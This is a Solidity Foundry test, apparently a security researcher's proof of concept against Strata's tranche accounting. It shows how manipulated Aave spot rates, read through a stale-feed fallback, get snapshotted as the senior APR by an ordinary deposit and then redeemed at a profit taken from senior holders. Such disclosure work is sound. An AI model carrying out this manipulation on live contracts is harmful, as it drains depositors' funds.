// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Test } from "forge-std/Test.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import { UD60x18 } from "@prb/math/src/ud60x18/ValueType.sol";

import { AccessControlManager } from "../../../contracts/governance/AccessControlManager.sol";
import { StrataCDO } from "../../../contracts/tranches/StrataCDO.sol";
import { Tranche } from "../../../contracts/tranches/Tranche.sol";
import { DiscreteAccounting } from "../../../contracts/tranches/DiscreteAccounting.sol";
import { AprPairFeed } from "../../../contracts/tranches/oracles/AprPairFeed.sol";
import {
    AaveAprPairProvider,
    IAavePool
} from "../../../contracts/tranches/strategies/ethena/AaveAprPairProvider.sol";
import { IsUSDe } from "../../../contracts/tranches/strategies/ethena/IsUSDe.sol";
import { MockERC20 } from "../../../contracts/test/MockERC20.sol";
import { MockStakedUSDe } from "../../../contracts/test/MockStakedUSDe.sol";
import { IAccounting } from "../../../contracts/tranches/interfaces/IAccounting.sol";
import { IStrategy } from "../../../contracts/tranches/interfaces/IStrategy.sol";
import { IStrataCDO } from "../../../contracts/tranches/interfaces/IStrataCDO.sol";
import { ITranche } from "../../../contracts/tranches/interfaces/ITranche.sol";
import { IStrategyAprPairProvider } from "../../../contracts/tranches/interfaces/IAprPairFeed.sol";

import { HuntStrategy } from "./DiscreteAccountingConservationInvariant.t.sol";

/// @dev AaveAprPairProvider only reads totalSupply() from the aToken address.
contract MockATokenSupply {
    uint256 public totalSupply;

    constructor(uint256 supply_) {
        totalSupply = supply_;
    }

    function setTotalSupply(uint256 supply_) external {
        totalSupply = supply_;
    }
}

contract MockAavePoolForApr is IAavePool {
    struct Market {
        uint128 liquidityRate;
        address aToken;
    }

    mapping(address => Market) internal markets;

    function setMarket(address asset, uint128 liquidityRate, address aToken) external {
        markets[asset] = Market({ liquidityRate: liquidityRate, aToken: aToken });
    }

    function setLiquidityRate(address asset, uint128 liquidityRate) external {
        markets[asset].liquidityRate = liquidityRate;
    }

    function getReserveData(address asset)
        external
        view
        returns (
            uint256,
            uint128,
            uint128 currentLiquidityRate,
            uint128,
            uint128,
            uint128,
            uint40,
            uint16,
            address aTokenAddress,
            address,
            address,
            address,
            uint128,
            uint128,
            uint128
        )
    {
        Market memory m = markets[asset];
        currentLiquidityRate = m.liquidityRate;
        aTokenAddress = m.aToken;
    }
}

struct AaveFallbackStack {
    MockERC20 asset;
    AccessControlManager acm;
    StrataCDO cdo;
    Tranche jrt;
    Tranche srt;
    DiscreteAccounting accounting;
    HuntStrategy strategy;
    AprPairFeed feed;
    AaveAprPairProvider provider;
    MockAavePoolForApr aave;
    MockATokenSupply aUsdc;
    MockATokenSupply aUsdt;
    MockERC20 usdc;
    MockERC20 usdt;
}

/// @notice Structural PoC for the stale-feed fallback path. It uses the real Strata
/// feed/provider/accounting stack and varies only external Aave spot state.
contract AaveAprFallbackManipulationPoC is Test {
    bytes32 internal constant PAUSER_ROLE = keccak256("PAUSER_ROLE");

    uint128 internal constant RATE_10_PERCENT_RAY = 100_000_000_000_000_000_000_000_000; // 0.10e27
    uint128 internal constant RATE_01_PERCENT_RAY =   1_000_000_000_000_000_000_000_000; // 0.001e27
    uint256 internal constant HONEST_TARGET = 100_000_000_000; // 10%, 12 decimals

    address internal owner;
    address internal juniorHolder;
    address internal seniorHolder;
    address internal attacker;

    struct Outcome {
        uint256 capturedTarget;
        uint256 restoredProviderTarget;
        uint256 attackerPayout;
        uint256 seniorAssetsAfter;
        uint256 juniorAssetsAfter;
    }

    function _deploy() internal returns (AaveFallbackStack memory s) {
        owner = makeAddr("owner");
        juniorHolder = makeAddr("juniorHolder");
        seniorHolder = makeAddr("seniorHolder");
        attacker = makeAddr("attacker");

        s.asset = new MockERC20("BASE", 18);
        s.usdc = new MockERC20("USDC", 6);
        s.usdt = new MockERC20("USDT", 6);
        s.aUsdc = new MockATokenSupply(1_000_000e6);
        s.aUsdt = new MockATokenSupply(1_000_000e6);
        s.aave = new MockAavePoolForApr();
        s.aave.setMarket(address(s.usdc), RATE_10_PERCENT_RAY, address(s.aUsdc));
        s.aave.setMarket(address(s.usdt), RATE_10_PERCENT_RAY, address(s.aUsdt));

        // No Ethena rewards are injected, so APRbase is zero after its 8-hour vesting window.
        MockStakedUSDe susde = new MockStakedUSDe(IERC20(address(s.asset)), owner, owner);
        vm.warp(block.timestamp + 9 hours);

        address[] memory benchmarks = new address[](2);
        benchmarks[0] = address(s.usdc);
        benchmarks[1] = address(s.usdt);
        s.provider = new AaveAprPairProvider(
            IAavePool(address(s.aave)),
            benchmarks,
            IsUSDe(address(susde))
        );

        s.acm = new AccessControlManager(owner);

        AprPairFeed feedImpl = new AprPairFeed();
        s.feed = AprPairFeed(address(new ERC1967Proxy(
            address(feedImpl),
            abi.encodeWithSelector(
                AprPairFeed.initialize.selector,
                owner,
                address(s.acm),
                IStrategyAprPairProvider(address(s.provider)),
                4 hours,
                "Aave fallback PoC"
            )
        )));

        StrataCDO cdoImpl = new StrataCDO(IERC20Metadata(address(s.asset)));
        s.cdo = StrataCDO(address(new ERC1967Proxy(
            address(cdoImpl),
            abi.encodeWithSelector(StrataCDO.initialize.selector, owner, address(s.acm))
        )));

        Tranche trancheImpl = new Tranche();
        s.jrt = Tranche(address(new ERC1967Proxy(
            address(trancheImpl),
            abi.encodeWithSelector(
                Tranche.initialize.selector,
                owner,
                address(s.acm),
                "Junior Tranche",
                "JRT",
                IERC20(address(s.asset)),
                IStrataCDO(address(s.cdo))
            )
        )));
        s.srt = Tranche(address(new ERC1967Proxy(
            address(trancheImpl),
            abi.encodeWithSelector(
                Tranche.initialize.selector,
                owner,
                address(s.acm),
                "Senior Tranche",
                "SRT",
                IERC20(address(s.asset)),
                IStrataCDO(address(s.cdo))
            )
        )));

        DiscreteAccounting accountingImpl = new DiscreteAccounting(18);
        s.accounting = DiscreteAccounting(address(new ERC1967Proxy(
            address(accountingImpl),
            abi.encodeWithSelector(
                DiscreteAccounting.initialize.selector,
                owner,
                address(s.acm),
                IStrataCDO(address(s.cdo)),
                s.feed
            )
        )));

        s.strategy = new HuntStrategy(IERC20(address(s.asset)), address(s.cdo));

        vm.startPrank(owner);
        s.cdo.configure(
            IAccounting(address(s.accounting)),
            IStrategy(address(s.strategy)),
            ITranche(address(s.jrt)),
            ITranche(address(s.srt))
        );
        s.acm.grantRole(PAUSER_ROLE, owner);
        s.cdo.setActionStates(address(0), true, true);
        vm.stopPrank();

        // latestRound.updatedAt is zero and the chain is already >4h old, so the feed
        // is now on its documented stale-round fallback to the live Aave provider.
        assertEq(s.provider.getAPRtarget(), int64(int256(HONEST_TARGET)), "bad honest provider target");
        assertEq(s.provider.getAPRbase(), 0, "base APR must be zero for isolated target test");
    }

    function _deposit(AaveFallbackStack memory s, address user, Tranche vault, uint256 amount)
        internal
        returns (uint256 shares)
    {
        s.asset.mint(user, amount);
        vm.startPrank(user);
        s.asset.approve(address(vault), type(uint256).max);
        shares = vault.deposit(amount, user);
        vm.stopPrank();
    }

    function _setManipulatedAaveState(AaveFallbackStack memory s) internal {
        // Model a temporary huge supply into the now-low-rate USDC market. The raw
        // aToken totalSupply weighting lets this market dominate the provider average.
        s.aUsdc.setTotalSupply(1_000_000_000e6);
        s.aave.setLiquidityRate(address(s.usdc), RATE_01_PERCENT_RAY);
    }

    function _restoreHonestAaveState(AaveFallbackStack memory s) internal {
        s.aUsdc.setTotalSupply(1_000_000e6);
        s.aave.setLiquidityRate(address(s.usdc), RATE_10_PERCENT_RAY);
    }

    function _play(bool manipulate) internal returns (Outcome memory out) {
        AaveFallbackStack memory s = _deploy();

        _deposit(s, juniorHolder, s.jrt, 1_000e18);
        _deposit(s, seniorHolder, s.srt, 1_000e18);
        assertEq(s.accounting.aprSrt().unwrap(), HONEST_TARGET, "honest target not installed");

        if (manipulate) {
            _setManipulatedAaveState(s);
            assertLt(uint256(uint64(s.provider.getAPRtarget())), HONEST_TARGET / 50, "target not suppressed");
        }

        // Ordinary, unprivileged JRT deposit. Its updateBalanceFlow() calls fetchAprs(),
        // and because the pushed feed is stale, the manipulated provider value is
        // persisted into DiscreteAccounting.aprTarget/aprSrt.
        uint256 attackerShares = _deposit(s, attacker, s.jrt, 1_000e18);
        out.capturedTarget = s.accounting.aprTarget().unwrap();

        if (manipulate) {
            _restoreHonestAaveState(s);
            out.restoredProviderTarget = uint256(uint64(s.provider.getAPRtarget()));
            assertEq(out.restoredProviderTarget, HONEST_TARGET, "provider did not restore");
            assertLt(out.capturedTarget, HONEST_TARGET / 50, "Strata did not retain manipulated target");
            assertEq(
                s.accounting.aprSrt().unwrap(),
                out.capturedTarget,
                "manipulated target not persisted as Senior APR"
            );
        } else {
            out.restoredProviderTarget = uint256(uint64(s.provider.getAPRtarget()));
            assertEq(out.capturedTarget, HONEST_TARGET, "control target changed");
        }

        // External Aave state is already honest again. No Strata balance flow occurs
        // during this interval, so the snapshotted aprSrt continues to govern accrual.
        vm.warp(block.timestamp + 30 days);
        s.strategy.reportYield(100e18);

        // A redemption settles the elapsed interval FIRST via cdo.updateAccounting().
        // Only later, inside cdo.withdraw/updateBalanceFlow, is the now-honest provider
        // fetched again. Therefore the user can realize the stale manipulated interval.
        uint256 beforeBal = s.asset.balanceOf(attacker);
        vm.prank(attacker);
        s.jrt.redeem(attackerShares, attacker, attacker);
        out.attackerPayout = s.asset.balanceOf(attacker) - beforeBal;

        (out.juniorAssetsAfter, out.seniorAssetsAfter,) = s.accounting.totalAssetsT0();
        assertEq(s.accounting.aprTarget().unwrap(), HONEST_TARGET, "exit did not restore honest provider APR");
    }

    function test_staleFallbackSpotAprCanBeSnapshottedAndRealized() public {
        Outcome memory control = _play(false);
        Outcome memory attack = _play(true);

        assertLt(attack.capturedTarget, control.capturedTarget, "attack did not lower captured target");
        assertGt(
            attack.attackerPayout,
            control.attackerPayout,
            "JRT attacker did not profit from suppressed Senior target APR"
        );
        assertLt(
            attack.seniorAssetsAfter,
            control.seniorAssetsAfter,
            "suppressed target did not transfer value away from Senior"
        );

        // With no change in total realized strategy yield, the attacker's additional
        // payout is funded by a corresponding reduction in Senior allocation.
        uint256 attackerAdvantage = attack.attackerPayout - control.attackerPayout;
        uint256 seniorShortfall = control.seniorAssetsAfter - attack.seniorAssetsAfter;
        assertGt(attackerAdvantage, 1e18, "economic effect too small in structural PoC");
        assertGt(seniorShortfall, 1e18, "Senior impact too small in structural PoC");
    }
}
